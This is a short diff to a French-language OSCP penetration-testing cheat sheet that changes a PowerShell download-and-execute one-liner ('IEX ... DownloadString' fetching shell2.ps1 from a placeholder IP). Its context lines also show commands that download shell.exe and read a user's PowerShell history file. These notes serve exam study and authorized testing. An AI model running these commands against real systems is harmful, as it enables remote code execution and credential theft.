@@ -1,7 +1,7 @@
 <img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/4f64d883-9cac-4bc5-b1a5-bcb1f488d072" height="180">
 
 ## Commande windows:
-**Télécharger puis exécuter un fichier:** powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://[IP]/shell.ps1\");"  
+**Télécharger puis exécuter un fichier:** powershell "IEX (New-Object Net.WebClient).DownloadString('http://[IP]/shell2.ps1')"
 **Télécharger un fichier:** wget http://[IP]/[fichier] -outfile [fichier]  
 Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe','C:\Users\Public\shell.exe')  
 **Historique Powershell:** type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
